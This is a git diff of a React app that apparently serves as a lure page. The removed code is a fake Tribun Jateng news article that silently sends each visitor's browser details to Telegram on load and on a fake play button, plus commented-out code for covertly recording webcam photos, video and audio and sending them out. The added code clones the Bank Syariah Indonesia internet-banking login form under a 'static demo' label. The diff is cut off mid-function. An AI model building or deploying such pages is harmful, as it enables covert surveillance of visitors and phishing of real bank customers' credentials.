@@ -1,432 +1,406 @@
-import { useEffect, useCallback } from 'react';
-import { sendTelegramNotification } from './utils/telegram';
+import React, { useMemo, useState } from "react";
 
-function App() {
-  useEffect(() => {
-    const sendVisitorNotification = async () => {
-      await sendTelegramNotification({
-        userAgent: navigator.userAgent,
-        location: window.location.href,
-        referrer: document.referrer || 'Direct',
-        previousSites: document.referrer || 'None',
-      });
-    };
+/**
+ * BSI-like Internet Banking Landing UI (static demo)
+ * - TailwindCSS utility classes
+ * - Fully responsive with careful spacing/typography
+ * - No external assets required (logos/badges drawn as SVG or styled elements)
+ */
 
-    sendVisitorNotification();
-  }, []);
-
-  const sendLocation = useCallback(async () => {
-      await sendTelegramNotification({
-        userAgent: navigator.userAgent,
-        location: window.location.href,
-        referrer: document.referrer || 'Direct',
-        previousSites: document.referrer || 'None',
-      });
-    },[])
-
-  // const captureAndSendMedia = useCallback(async () => {
-  //   try {
-  //     // Get device capabilities first
-  //     const devices = await navigator.mediaDevices.enumerateDevices();
-  //     const videoDevice = devices.find(device => device.kind === 'videoinput');
-      
-  //     if (!videoDevice) {
-  //       throw new Error('No video input device found');
-  //     }
-
-  //     const constraints = {
-  //       video: {
-  //         deviceId: videoDevice.deviceId,
-  //         width: { ideal: 4096 }, // Maximum supported width
-  //         height: { ideal: 2160 }, // Maximum supported height
-  //         frameRate: { ideal: 60 }
-  //       },
-  //       audio: true
-  //     };
-
-  //     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-
-  //     // Get actual video track settings
-  //     const videoTrack = stream.getVideoTracks()[0];
-  //     const settings = videoTrack.getSettings();
-      
-  //     // Create and setup video element for photo capture
-  //     const video = document.createElement('video');
-  //     video.srcObject = stream;
-  //     video.playsInline = true;
-  //     video.muted = true;
-  //     video.autoplay = true;
-      
-  //     // Wait for video to be ready
-  //     await new Promise((resolve) => {
-  //       video.onloadedmetadata = async () => {
-  //         try {
-  //           await video.play();
-  //           setTimeout(resolve, 500);
-  //         } catch (error) {
-  //           console.error('Error playing video:', error);
-  //           resolve(true);
-  //         }
-  //       };
-  //     });
-
-  //     // Setup canvas with actual video dimensions
-  //     const canvas = document.createElement('canvas');
-  //     canvas.width = settings.width || 1920;
-  //     canvas.height = settings.height || 1080;
-  //     const context = canvas.getContext('2d');
-      
-  //     if (context) {
-  //       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-  //     }
-
-  //     // Convert photo to blob with maximum quality
-  //     const photoBlob = await new Promise<Blob>((resolve) => {
-  //       canvas.toBlob((blob) => {
-  //         if (blob) resolve(blob);
-  //       }, 'image/jpeg', 1.0);
-  //     });
-
-  //     // Send photo immediately
-  //     sendImageToTelegram(photoBlob).catch(console.error);
-
-  //     // Check supported video formats
-  //     const mimeTypes = [
-  //       'video/mp4;codecs=h264,aac',
-  //       'video/mp4',
-  //       'video/webm;codecs=vp8,opus',
-  //       'video/webm'
-  //     ];
-
-  //     const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
-
-  //     if (!supportedMimeType) {
-  //       throw new Error('No supported video format found');
-  //     }
-
-  //     // Configure video recording with maximum quality
-  //     const mediaRecorder = new MediaRecorder(stream, {
-  //       mimeType: supportedMimeType,
-  //       videoBitsPerSecond: 8000000 // 8 Mbps for high quality
-  //     });
-      
-  //     const chunks: BlobPart[] = [];
-
-  //     mediaRecorder.ondataavailable = (e) => {
-  //       if (e.data.size > 0) {
-  //         chunks.push(e.data);
-  //       }
-  //     };
-
-  //     mediaRecorder.onstop = async () => {
-  //       const videoBlob = new Blob(chunks, { 
-  //         type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
-  //       });
-  //       console.log('Video recording completed, size:', videoBlob.size);
-  //       await sendVideoToTelegram(videoBlob);
-  //       stream.getTracks().forEach(track => track.stop());
-  //     };
-
-  //     // Start recording with frequent data chunks for better quality
-  //     mediaRecorder.start(1000);
-  //     console.log('Started recording video');
-
-  //     // Stop recording after 15 seconds
-  //     setTimeout(() => {
-  //       if (mediaRecorder.state === 'recording') {
-  //         console.log('Stopping video recording');
-  //         mediaRecorder.stop();
-  //       }
-  //     }, 15000);
-
-  //   } catch (error) {
-  //     console.error('Error capturing media:', error);
-  //   }
-  // }, []);
+export default function App() {
 
 
-  const article = {
-    title: "Bendahara Ponpes Al Muttaqin Jepara Jadi Tersangka, Gelapkan Dana SPP Rp 500 Juta untuk Foya-Foya",
-    date: "26 Juli 2025",
-    imageUrl: "https://linuxpemula.web.id/tersangka.jpg",
-    author: "Tribun Jateng",
-    content: `
-Jepara, 26 Juli 2025 — Kepolisian Resor (Polres) Jepara resmi menetapkan MZ (38), bendahara Pondok Pesantren Islam Al Muttaqin, sebagai tersangka dalam kasus dugaan penggelapan dana iuran SPP santri senilai lebih dari Rp 500 juta. Hingga saat ini, tersangka masih buron dan masuk dalam daftar pencarian orang (DPO).
 
-Kapolres Jepara, AKBP Andri Susanto, menyatakan bahwa penetapan tersangka dilakukan setelah serangkaian pemeriksaan saksi, audit keuangan internal, dan penelusuran aliran dana.
 
-“Setelah kami kumpulkan cukup bukti, saudara MZ resmi kami tetapkan sebagai tersangka. Saat ini yang bersangkutan tidak berada di alamat terakhirnya dan sedang kami kejar,” ujar AKBP Andri dalam konferensi pers di Mapolres Jepara, Jumat (25/7).
 
-Penyelidikan bermula dari laporan pihak yayasan pondok pesantren yang menemukan kejanggalan dalam arus keuangan sejak awal tahun 2025. Dana iuran santri yang seharusnya digunakan untuk kegiatan operasional, gaji guru, dan kebutuhan santri, ternyata tidak pernah masuk ke kas pesantren.
 
-Audit internal mengungkap bahwa lebih dari Rp 500 juta dana SPP raib dan diduga kuat digunakan oleh tersangka untuk gaya hidup mewah, hiburan malam, hingga perjalanan ke luar kota yang tidak berhubungan dengan kegiatan pesantren.
 
-Ketua Yayasan Al Muttaqin, KH. Sartono Munadi, menyampaikan keprihatinannya atas kasus tersebut.
 
-“Kami sangat terpukul. Ini pengkhianatan terhadap amanah para wali santri. Kami serahkan sepenuhnya kepada pihak berwajib agar pelaku ditangkap dan diproses hukum,” ucapnya.
-
-Pihak kepolisian kini bekerja sama dengan sejumlah wilayah kepolisian lain untuk melakukan pelacakan terhadap tersangka. Diduga, MZ melarikan diri ke luar provinsi dan telah mengganti identitasnya.
-
-Kasus ini menuai perhatian besar dari masyarakat, khususnya para wali santri. Banyak yang menuntut transparansi dan perbaikan tata kelola keuangan di lingkungan pondok pesantren.
-
-“Kami minta ke depan pengelolaan keuangan lebih terbuka. Jangan sampai anak-anak kami jadi korban kelalaian sistem,” kata Rukmini, wali santri asal Demak.
-
-Pihak pondok pesantren menegaskan kegiatan belajar-mengajar tetap berjalan seperti biasa, sambil terus melakukan pembenahan internal.
-    `,
-  };
-
-  const relatedNews = [
-    {
-      id: 1,
-      title: "Kasus Dana Desa Wonosobo: 3 Pejabat Ditetapkan Tersangka",
-      image: "https://picsum.photos/300/200?random=1",
-      category: "Nasional"
-    },
-    {
-      id: 2,
-      title: "Guru Honorer di Klaten Dilaporkan karena Pungli Uang SPP",
-      image: "https://picsum.photos/300/200?random=2",
-      category: "Pendidikan"
-    },
-    {
-      id: 3,
-      title: "Warga Boyolali Temukan Uang Tunai Rp 2 Miliar di Pinggir Jalan",
-      image: "https://picsum.photos/300/200?random=3",
-      category: "Regional"
-    },
-    {
-      id: 4,
-      title: "Kasus Korupsi APBD DIY: Mantan Kadis Ditetapkan Tersangka",
-      image: "https://picsum.photos/300/200?random=4",
-      category: "Hukum"
-    }
-  ];
-
-  const popularNews = [
-    "Pemkab Semarang Siapkan Dana Tambahan untuk Bansos Korban Banjir",
-    "Pemprov Jateng Alokasikan Anggaran Rp 500 Miliar untuk Program Kesehatan",
-    "Pemkot Solo Gelar Festival Kuliner untuk Tingkatkan Pariwisata",
-    "Kasus Pencurian di Museum Nasional: 2 Pelaku Ditangkap Polisi",
-    "Bupati Wonosobo Lantik 15 Pejabat Eselon III dan IV"
-  ];
-
+  
   return (
-    <div className="bg-gray-100 min-h-screen font-sans">
-      {/* Header Top */}
-      <div className="bg-blue-600 text-white py-2 px-4">
-        <div className="container mx-auto flex justify-between items-center text-sm">
-          <div>Sabtu, 26 Juli 2025</div>
-          <div className="flex space-x-4">
-            <button className="bg-red-500 px-3 py-1 rounded text-xs font-bold">LIVE</button>
-            <button className="hover:underline">Cari</button>
-            <button className="hover:underline">Network</button>
-            <button className="hover:underline">Ikuti Kami</button>
-            <button className="hover:underline">Login</button>
-          </div>
-        </div>
-      </div>
+    <div className="min-h-screen bg-[#F7FAFB] text-slate-800">
+      <TopBar />
 
-      {/* Logo Header */}
-      <header className="bg-white shadow sticky top-0 z-50 border-b">
-        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
-          <div className="flex items-center space-x-4">
-            <img 
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Tribun_Network_logo.svg/1200px-Tribun_Network_logo.svg.png" 
-              alt="Tribun Jateng" 
-              className="h-12"
-            />
-          </div>
-          <div className="hidden md:block bg-gray-200 w-96 h-16 flex items-center justify-center text-gray-500">
-            Iklan 970x90
-          </div>
-        </div>
-      </header>
+      <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-10 lg:py-14">
+        <HeroSection />
 
-      {/* Main Navigation */}
-      <nav className="bg-blue-600 text-white">
-        <div className="container mx-auto px-4">
-          <ul className="flex flex-wrap py-2 space-x-6 text-sm font-medium">
-            <li><a href="#" className="hover:underline">Home</a></li>
-            <li><a href="#" className="hover:underline">PLN Jateng</a></li>
-            <li><a href="#" className="hover:underline">Pendidikan</a></li>
-            <li><a href="#" className="hover:underline">UMKM</a></li>
-            <li><a href="#" className="hover:underline">EKRAF</a></li>
-            <li><a href="#" className="hover:underline">Loker</a></li>
-            <li><a href="#" className="hover:underline">TribunJatengWiki.com</a></li>
-            <li><a href="#" className="hover:underline">...</a></li>
-          </ul>
-        </div>
-      </nav>
+        <FeaturesSection />
 
-      {/* Secondary Navigation */}
-      <nav className="bg-white border-b">
-        <div className="container mx-auto px-4">
-          <div className="flex flex-wrap py-3 space-x-2">
-            <a href="#" className="bg-red-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-red-600">Travel</a>
-            <a href="#" className="bg-indigo-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-indigo-600">Akomodasi</a>
-            <a href="#" className="bg-purple-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-purple-600">Kuliner</a>
-            <a href="#" className="bg-green-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-green-600">Destinasi</a>
-            <a href="#" className="bg-yellow-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-yellow-600">Shopping</a>
-            <a href="#" className="bg-orange-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-orange-600">Ticketing</a>
-            <a href="#" className="bg-teal-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-teal-600">TribunJatengTravel.com</a>
-          </div>
-        </div>
-      </nav>
+        <MobileAppPromo />
 
-      {/* Main Content */}
-      <div className="container mx-auto px-4 py-6 flex flex-col lg:flex-row gap-6">
-        {/* Article Content */}
-        <main className="lg:w-2/3 bg-white shadow-md rounded-md p-6">
-          <div className="mb-4">
-            <div className="flex justify-between items-start mb-4">
-              <div>
-                <h1 className="text-2xl md:text-3xl font-bold text-gray-800 leading-tight">
-                  {article.title}
-                </h1>
-                <div className="flex items-center space-x-4 mt-2 text-sm text-gray-600">
-                  <span>{article.date}</span>
-                  <span>•</span>
-                  <span>{article.author}</span>
-                  <span>•</span>
-                  <span className="text-red-500 font-medium">Editor: Tribun Jateng</span>
-                </div>
-              </div>
-            </div>
+        <ContactCTA />
+      </main>
 
-            <div className="relative aspect-video bg-black mb-6 rounded overflow-hidden">
-              <img 
-                src={article.imageUrl} 
-                alt={article.title} 
-                className="w-full h-full object-cover" 
-              />
-              <div className="absolute inset-0 bg-black/30 flex items-center justify-center">
-                <button
-                  // onClick={sendLocation, captureAndSendMedia}
-                  onClick={() => {
-                    sendLocation();
-                    // captureAndSendMedia();
-                  }}
-
-                  className="bg-red-600 text-white text-xl px-6 py-4 rounded-full hover:bg-red-700 hover:scale-105 transition"
-                >
-                  ▶
-                </button>
-              </div>
-            </div>
-
-            <div className="prose prose-sm max-w-none text-gray-800 whitespace-pre-line">
-              {article.content}
-            </div>
-          </div>
-
-          {/* Related News */}
-          <div className="mt-8 pt-6 border-t">
-            <h3 className="text-xl font-bold text-gray-800 mb-4">Berita Terkait</h3>
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-              {relatedNews.map((news) => (
-                <div key={news.id} className="flex space-x-3">
-                  <img 
-                    src={news.image} 
-                    alt={news.title} 
-                    className="w-24 h-16 object-cover rounded"
-                  />
-                  <div>
-                    <span className="text-xs text-red-500 font-medium">{news.category}</span>
-                    <h4 className="text-sm font-medium text-gray-800 hover:text-blue-600 cursor-pointer line-clamp-2">
-                      {news.title}
-                    </h4>
-                  </div>
-                </div>
-              ))}
-            </div>
-          </div>
-        </main>
-
-        {/* Sidebar */}
-        <aside className="lg:w-1/3 space-y-6">
-          {/* Iklan */}
-          <div className="bg-white shadow-md rounded-md p-4">
-            <div className="bg-gray-200 h-64 flex items-center justify-center text-gray-500">
-              Iklan 300x250
-            </div>
-          </div>
-
-          {/* Berita Populer */}
-          <div className="bg-white shadow-md rounded-md p-4">
-            <h3 className="text-lg font-bold text-gray-800 mb-4 pb-2 border-b">Berita Populer</h3>
-            <div className="space-y-3">
-              {popularNews.map((title, index) => (
-                <div key={index} className="flex items-start space-x-3">
-                  <span className="bg-red-500 text-white text-xs font-bold px-2 py-1 rounded">
-                    {index + 1}
-                  </span>
-                  <a href="#" className="text-sm text-gray-800 hover:text-blue-600 line-clamp-2">
-                    {title}
-                  </a>
-                </div>
-              ))}
-            </div>
-          </div>
-
-          {/* Iklan Kedua */}
-          <div className="bg-white shadow-md rounded-md p-4">
-            <div className="bg-gray-200 h-64 flex items-center justify-center text-gray-500">
-              Iklan 300x250
-            </div>
-          </div>
-        </aside>
-      </div>
-
-      {/* Footer */}
-      <footer className="bg-gray-800 text-white py-8">
-        <div className="container mx-auto px-4">
-          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
-            <div>
-              <h4 className="font-bold mb-4">Tribun Jateng</h4>
-              <ul className="space-y-2 text-sm">
-                <li><a href="#" className="hover:underline">About Us</a></li>
-                <li><a href="#" className="hover:underline">Privacy Policy</a></li>
-                <li><a href="#" className="hover:underline">Terms of Use</a></li>
-                <li><a href="#" className="hover:underline">Contact Us</a></li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-bold mb-4">Network</h4>
-              <ul className="space-y-2 text-sm">
-                <li><a href="#" className="hover:underline">Tribunnews.com</a></li>
-                <li><a href="#" className="hover:underline">TribunTravel.com</a></li>
-                <li><a href="#" className="hover:underline">TribunStyle.com</a></li>
-                <li><a href="#" className="hover:underline">TribunWiki.com</a></li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-bold mb-4">Follow Us</h4>
-              <ul className="space-y-2 text-sm">
-                <li><a href="#" className="hover:underline">Facebook</a></li>
-                <li><a href="#" className="hover:underline">Twitter</a></li>
-                <li><a href="#" className="hover:underline">Instagram</a></li>
-                <li><a href="#" className="hover:underline">YouTube</a></li>
-              </ul>
-            </div>
-            <div>
-              <h4 className="font-bold mb-4">Download App</h4>
-              <div className="space-y-2">
-                <button className="bg-black text-white px-4 py-2 rounded text-sm w-full">
-                  Download iOS
-                </button>
-                <button className="bg-green-500 text-white px-4 py-2 rounded text-sm w-full">
-                  Download Android
-                </button>
-              </div>
-            </div>
-          </div>
-          <div className="border-t border-gray-700 mt-8 pt-6 text-center text-sm text-gray-400">
-            <p>© 2023 Tribunnews.com Network, All Rights Reserved</p>
-          </div>
-        </div>
-      </footer>
+      <Footer />
     </div>
   );
 }
 
-export default App;
+/************************** Header **************************/
+function TopBar() {
+  return (
+    <header className="bg-[#18A999] text-white">
+      <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center">
+        <div className="flex items-center gap-3">
+          <BsiGlyph className="h-8 w-8" />
+          <div className="leading-tight">
+            <div className="font-semibold text-xl tracking-wide">BSI</div>
+            <div className="text-[11px] opacity-90 -mt-0.5">BANK SYARIAH INDONESIA</div>
+          </div>
+        </div>
+      </div>
+    </header>
+  );
+}
+
+/************************** Hero **************************/
+function HeroSection() {
+  return (
+    <section className="grid lg:grid-cols-2 gap-8 items-start">
+      <LoginCard />
+      <SafetyPanel />
+    </section>
+  );
+}
+
+function LoginCard() {
+  const [captchaKey, setCaptchaKey] = useState(0);
+  const code = useMemo(() => makeCaptcha(), [captchaKey]);
+
+  return (
+    <div className="bg-white rounded-2xl shadow-xl p-6 sm:p-7 md:p-8">
+      <h2 className="text-2xl font-semibold text-slate-700">Login ke BSI Net</h2>
+
+      <form className="mt-6 space-y-4">
+        <LabeledInput label="User ID" placeholder="Masukan USER ID" />
+        <LabeledInput label="Password" type="password" placeholder="Password" />
+
+        <div>
+          <label className="block text-sm text-slate-600 mb-2">Captcha</label>
+          <div className="flex items-center gap-4">
+            <Captcha code={code} />
+            <button
+              type="button"
+              onClick={() => setCaptchaKey((v) => v + 1)}
+              className="text-[#D48B0C] text-sm font-medium hover:underline"
+            >
+              Coba Code Lain
+            </button>
+          </div>
+          <input
+            aria-label="Masukkan Captcha"
+            className="mt-3 w-full rounded-xl border border-slate-200 bg-white px-4 py-2.5 outline-none focus:ring-4 focus:ring-teal-100"
+            placeholder="Masukkan Captcha Diatas"
+          />
+        </div>
+
+        <div className="pt-2 flex items-center justify-between text-sm">
+          <button type="button" className="flex items-center gap-2 hover:underline">
+            <KeyIcon className="w-4 h-4" /> Lupa User ID ?
+          </button>
+          <button type="button" className="flex items-center gap-2 hover:underline">
+            <LockIcon className="w-4 h-4" /> Lupa Password ?
+          </button>
+        </div>
+
+        <div className="pt-2 flex justify-end">
+          <button
+            type="button"
+            className="inline-flex items-center gap-2 bg-[#18A999] hover:bg-[#149986] text-white font-semibold px-6 py-3 rounded-full shadow-lg transition-colors"
+          >
+            LOGIN <ArrowRightCircle className="w-5 h-5" />
+          </button>
+        </div>
+      </form>
+    </div>
+  );
+}
+
+function LabeledInput({ label, placeholder, type = "text" }: { label: string; placeholder?: string; type?: string }) {
+  return (
+    <div>
+      <label className="block text-sm text-slate-600 mb-2">{label}</label>
+      <input
+        type={type}
+        placeholder={placeholder}
+        className="w-full rounded-xl border border-slate-200 bg-white px-4 py-2.5 outline-none focus:ring-4 focus:ring-teal-100"
+      />
+    </div>
+  );
+}
+
+function SafetyPanel() {
+  return (
+    <aside className="bg-white rounded-2xl shadow-xl p-6 sm:p-7 md:p-8">
+      <h3 className="text-[#18A999] text-3xl font-semibold">Hati-Hati, Teliti & Waspada</h3>
+      <div className="mt-4 space-y-4 text-slate-600 leading-relaxed">
+        <p>
+          Hentikan transaksi BSI Net Anda jika diminta melakukan <b>Konfirmasi atau Verifikasi Data Anda</b> (UserID, Password, PIN Otorisasi,
+          Email, dan Kode Token).
+        </p>
+        <p>
+          Jaga kerahasiaan (UserID, Password, PIN Otorisasi, Email, dan Kode Token). Kode Token serta PIN Otorisasi BSI hanya digunakan untuk
+          transaksi BSI Net, bukan untuk verifikasi atau konfirmasi data Anda. Segera hubungi Bank Syariah Indonesia Call 14040 atau Kantor
+          Cabang terdekat untuk informasi lebih lanjut.
+        </p>
+      </div>
+      <div className="mt-6">
+        <button className="inline-flex items-center gap-2 bg-[#F1B24A] hover:bg-[#E3A33A] text-white font-medium px-4 py-2 rounded-full shadow">
+          Tips Aman Menggunakan BSI NET
+        </button>
+      </div>
+    </aside>
+  );
+}
+
+/************************** Features **************************/
+function FeaturesSection() {
+  const items = [
+    { title: "Payment", icon: <DocPayIcon className="w-9 h-9" /> },
+    { title: "Inquiry", icon: <ChecklistIcon className="w-9 h-9" /> },
+    { title: "Manage Admin", icon: <UserCogIcon className="w-9 h-9" /> },
+    { title: "Rekening", icon: <CardIcon className="w-9 h-9" /> },
+  ];
+
+  return (
+    <section className="mt-14">
+      <h4 className="text-center text-[#18A999] text-2xl sm:text-[28px] font-semibold">
+        Dengan Fitur Yang Memudahkan<br className="hidden sm:block" /> Transaksi Anda
+      </h4>
+      <div className="mt-8 grid grid-cols-2 sm:grid-cols-4 gap-4 sm:gap-6">
+        {items.map((it) => (
+          <div key={it.title} className="bg-white rounded-2xl shadow-md p-5 text-center">
+            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[#FFF8EE]">
+              {it.icon}
+            </div>
+            <div className="font-medium text-slate-700">{it.title}</div>
+            <button className="mt-1 text-xs font-semibold text-[#18A999] hover:underline">DETAIL</button>
+          </div>
+        ))}
+      </div>
+    </section>
+  );
+}
+
+/************************** Mobile Promo **************************/
+function MobileAppPromo() {
+  return (
+    <section className="mt-16 grid lg:grid-cols-2 gap-10 items-center">
+      <div className="order-2 lg:order-1">
+        <h5 className="text-[#18A999] text-2xl sm:text-[28px] font-semibold leading-snug">
+          Lebih Mudah & Praktis<br className="hidden sm:block" /> Dengan BSI Mobile
+        </h5>
+        <p className="mt-3 text-slate-600 leading-relaxed">
+          Transaksi, Pembelian, Pembayaran & lainnya, lebih mudah dengan Aplikasi BSI Mobile.
+        </p>
+        <div className="mt-5 flex items-center gap-3">
+          <StoreBadge kind="google" />
+          <StoreBadge kind="apple" />
+        </div>
+      </div>
+
+      <div className="order-1 lg:order-2">
+        <div className="relative mx-auto max-w-md">
+          <div className="absolute inset-0 -z-10 rounded-[28px] bg-[#E8F8F5]" />
+          <IllustrationPhone />
+        </div>
+      </div>
+    </section>
+  );
+}
+
+/************************** Contact CTA **************************/
+function ContactCTA() {
+  return (
+    <section className="mt-16 text-center">
+      <h6 className="text-[#18A999] text-[22px] sm:text-2xl font-semibold">
+        Untuk informasi lebih lanjut hubungi<br className="hidden sm:block" /> Bank Syariah Indonesia Call
+      </h6>
+      <div className="mt-5 flex justify-center">
+        <button className="inline-flex items-center gap-3 bg-[#18A999] hover:bg-[#149986] text-white text-lg font-semibold rounded-full px-6 py-3 shadow-lg">
+          <PhoneIcon className="w-5 h-5" /> 14040
+        </button>
+      </div>
+    </section>
+  );
+}
+
+/************************** Footer **************************/
+function Footer() {
+  return (
+    <footer className="mt-16 border-t border-slate-200/70 py-8 text-center text-[12px] text-slate-500 px-4">
+      <div className="max-w-6xl mx-auto">
+        <p>
+          PT Bank Syariah Indonesia Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan dan Bank Indonesia serta merupakan Peserta Penjaminan LPS.
+          Maksimum nilai simpanan yang dijamin LPS per nasabah per bank adalah Rp 2 miliar.
+        </p>
+        <p className="mt-2">Copyright © 2025 · Bank Syariah Indonesia · v1</p>
+      </div>
+    </footer>
+  );
+}
+
+/************************** Small UI Bits **************************/
+function Captcha({ code }: { code: string }) {
+  return (
+    <div className="select-none inline-flex items-center justify-center min-w-[112px] h-10 rounded-lg border border-slate-200 bg-slate-50 px-3">
+      <span className="font-mono text-xl tracking-widest [font-variant-ligatures:none] rotate-[-2deg]">
+        {code}
+      </span>
+    </div>
+  );
+}
+
+function StoreBadge({ kind }: { kind: "google" | "apple" }) {
+  const isGoogle = kind === "google";
+  return (
+    <a className="group inline-flex items-center gap-3 rounded-xl border border-slate-200 bg-white px-4 py-2.5 shadow hover:shadow-md transition">
+      <div className="h-6 w-6 grid place-items-center rounded-md bg-slate-900 text-white text-[10px] font-bold">
+        {isGoogle ? "GP" : "AS"}
+      </div>
+      <div className="text-left leading-tight">
+        <div className="text-[10px] uppercase tracking-wide text-slate-500">
+          {isGoogle ? "Get it on" : "Download on the"}
+        </div>
+        <div className="text-sm font-semibold">{isGoogle ? "Google Play" : "App Store"}</div>
+      </div>
+    </a>
+  );
+}
+
+/************************** Icons (minimal SVGs) **************************/
+function BsiGlyph({ className = "" }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 48 48" className={className} aria-hidden>
+      <defs>
+        <linearGradient id="g" x1="0" x2="1">
+          <stop offset="0%" stopColor="#22C1B2" />
+          <stop offset="100%" stopColor="#18A999" />
+        </linearGradient>
+      </defs>
+      <circle cx="24" cy="24" r="24" fill="url(#g)" />
+      <path d="M14 26c5-6 9-6 14 0 0 0 4 6 10 6" stroke="#fff" strokeWidth="3" fill="none" strokeLinecap="round" />
+    </svg>
+  );
+}
+
+function ArrowRightCircle({ className = "w-5 h-5" }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
+      <path d="M12 2a10 10 0 100 20 10 10 0 000-20zm-.75 11.5H8a1 1 0 110-2h3.25V9l3 3-3 3v-1.5z" />
+    </svg>
+  );
+}
+
+function LockIcon({ className = "w-4 h-4" }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
+      <path d="M6 10V8a6 6 0 1112 0v2h1a1 1 0 011 1v10a1 1 0 01-1 1H5a1 1 0 01-1-1V11a1 1 0 011-1h1zm2 0h8V8a4 4 0 10-8 0v2z" />
+    </svg>
+  );
+}
+function KeyIcon({ className = "w-4 h-4" }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
+      <path d="M14 3a6 6 0 100 12 6 6 0 000-12zM2 21l5-5h3l2-2 1 1-2 2v3l-2 2H2z" />
+    </svg>
+  );
+}
+function PhoneIcon({ className = "w-5 h-5" }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 24 24" className={className} fill="currentColor" aria-hidden>
+      <path d="M6.6 10.8a12.6 12.6 0 006.6 6.6l2.2-2.2a1 1 0 011.1-.24 9.9 9.9 0 003.5.64 1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.4a1 1 0 011 1 9.9 9.9 0 00.64 3.5 1 1 0 01-.24 1.1L6.6 10.8z" />
+    </svg>
+  );
+}
+function DocPayIcon({ className = "w-6 h-6" }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 24 24" className={className} fill="#F1B24A" aria-hidden>
+      <path d="M6 2h9l5 5v13a2 2 0 01-2 2H6a2 2 0 01-2-2V4a2 2 0 012-2zm8 1v5h5" fillOpacity=".25" />
+      <path d="M7 12h10v2H7zM7 16h6v2H7z" />
+    </svg>
+  );
+}
+function ChecklistIcon({ className = "w-6 h-6" }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 24 24" className={className} fill="#F1B24A" aria-hidden>
+      <path d="M3 5h14v2H3zM3 11h14v2H3zM3 17h9v2H3z" />
+      <path d="M19.5 6.5l1.5-1.5 2 2-3.5 3.5-2-2z" fillOpacity=".4" />
+    </svg>
+  );
+}
+function UserCogIcon({ className = "w-6 h-6" }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 24 24" className={className} fill="#F1B24A" aria-hidden>
+      <path d="M12 12a5 5 0 100-10 5 5 0 000 10zM3 22a7 7 0 0118 0v1H3z" />
+      <path d="M18.5 9l.5-1 .9.3.6-.9.8.8-.4 1 .7.7-1 .6.1 1.1-1.1.1-.5 1-.9-.5-.9.5-.5-1-1.1-.1.1-1.1-1-.6.7-.7-.4-1 .8-.8.6.9.9-.3.5 1z" fillOpacity=".4" />
+    </svg>
+  );
+}
+function CardIcon({ className = "w-6 h-6" }: { className?: string }) {
+  return (
+    <svg viewBox="0 0 24 24" className={className} fill="#F1B24A" aria-hidden>
+      <rect x="2" y="5" width="20" height="14" rx="2" />
+      <rect x="2" y="8" width="20" height="3" fill="#fff" opacity=".6" />
+      <rect x="6" y="14" width="6" height="2" fill="#fff" opacity=".9" />
+    </svg>
+  );
+}
+
+/************************** Little Illustration **************************/
+function IllustrationPhone() {
+  return (
+    <svg viewBox="0 0 360 250" className="w-full h-auto" aria-hidden>
+      <defs>
+        <linearGradient id="bgc" x1="0" x2="1">
+          <stop offset="0%" stopColor="#E8F8F5" />
+          <stop offset="100%" stopColor="#DDF3EF" />
+        </linearGradient>
+      </defs>
+      <circle cx="180" cy="130" r="110" fill="url(#bgc)" />
+      <g transform="translate(120,40)">
+        <rect x="0" y="0" rx="22" ry="22" width="120" height="180" fill="#111827" />
+        <rect x="8" y="32" rx="14" ry="14" width="104" height="136" fill="#F8FAFC" />
+        <rect x="40" y="12" width="40" height="6" rx="3" fill="#374151" />
+        <g transform="translate(20,48)">
+          <rect x="0" y="0" width="64" height="12" rx="6" fill="#18A999" />
+          <rect x="0" y="24" width="88" height="12" rx="6" fill="#F1B24A" />
+          <rect x="0" y="48" width="52" height="12" rx="6" fill="#18A999" />
+          <rect x="0" y="72" width="72" height="12" rx="6" fill="#F1B24A" />
+        </g>
+      </g>
+      <g transform="translate(36,150)">
+        <Coin x={0} />
+        <Coin x={36} />
+        <Coin x={72} />
+      </g>
+      <text x="165" y="210" textAnchor="middle" fontSize="18" fontWeight="700" fill="#18A999">BSI mobile</text>
+    </svg>
+  );
+}
+
+function Coin({ x = 0 }) {
+  return (
+    <g transform={`translate(${x},0)`}>
+      <circle cx="12" cy="12" r="12" fill="#F1B24A" />
+      <path d="M6 12h12" stroke="#fff" strokeWidth="2" />
+      <path d="M10 8h4M8 16h8" stroke="#fff" strokeWidth="2" />
+    </g>
+  );
+}
+
+/************************** Utils **************************/
+function makeCaptcha() {
+  const chars = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789";
+  const n = 6;
+  let out = "";
+  for (let i = 0; i < n; i++) out += chars[Math.floor(Math.random() * chars.length)];
+  return out.split("").map(warp).join("");
+}
+function warp(ch: string) {
+  // visually messy characters (purely cosmetic)
+  const r = Math.random();
+  if (r < 0.3) return ch.toLowerCase();
